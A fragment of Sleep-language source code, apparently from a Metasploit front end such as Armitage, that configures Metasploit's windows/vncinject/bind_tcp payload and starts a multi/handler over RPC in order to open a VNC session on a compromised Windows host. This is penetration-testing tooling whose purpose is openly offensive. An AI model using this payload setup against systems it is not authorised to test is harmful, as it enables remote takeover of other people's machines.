...
sub vncsetup {
	...
	#
	# 3) start windows/vncinject/bind_tcp multi/handler...
	#
	%o = %();
	%o["PAYLOAD"]       = "windows/vncinject/bind_tcp";
	%o["RHOST"]         = "127.0.0.2";
	%o["RPORT"]         = "$rport";
	%o["LPORT"]         = "$rport";
	%o["EXITFUNC"]      = "process";
	%o["ExitOnSession"] = "true";
	%o["AUTOVNC"]       = "false";
	%o["WfsDelay"]      = "60";
	%o["VNCPORT"]       = "$vport";
	%o["VNCHOST"]       = iff($vhost eq "127.0.0.1", $vhost, "0.0.0.0");
	%o["ViewOnly"]      = "false";
	%o["DisableCourtesyShell"] = "true";

	#module_execute("exploit", "multi/handler", %o);
	call_async($mclient, "module.execute", "exploit", "multi/handler", %o);

	local('$viewer');
	$viewer = [new com.glavsoft.viewer.Viewer: $vhost, $vport, lambda({
